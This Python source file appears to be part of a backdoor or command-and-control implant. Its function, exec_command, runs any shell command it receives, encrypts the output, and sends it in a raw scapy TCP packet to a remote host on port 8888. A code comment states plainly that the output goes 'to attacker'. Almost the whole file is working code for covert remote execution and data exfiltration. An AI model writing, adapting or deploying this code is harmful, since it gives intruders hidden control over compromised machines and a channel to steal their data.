from scapy.all import *
import subprocess
import encryption as encryption


def exec_command(command, host_ip):
    cmd = subprocess.Popen(command, 
                           shell=True,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)

    out, errs = cmd.communicate()
    output = out + errs

    if output.strip() == b"":
        output = (command.decode("utf-8") + " : no output on remote\n").encode("utf-8")

    # Encrypt output and send to attacker
    encrypted_output = encryption.encrypt_data(output)
    # chunks = [encrypted_output[i:i+1000] for i in range(0, len(encrypted_output), 1000)]
    # chunks[-1] += "$NOTIF"


    pkt = IP(dst=host_ip)/TCP(sport=RandShort(), dport=8888)/encrypted_output
    send(pkt, verbose=False)
    time.sleep(1)
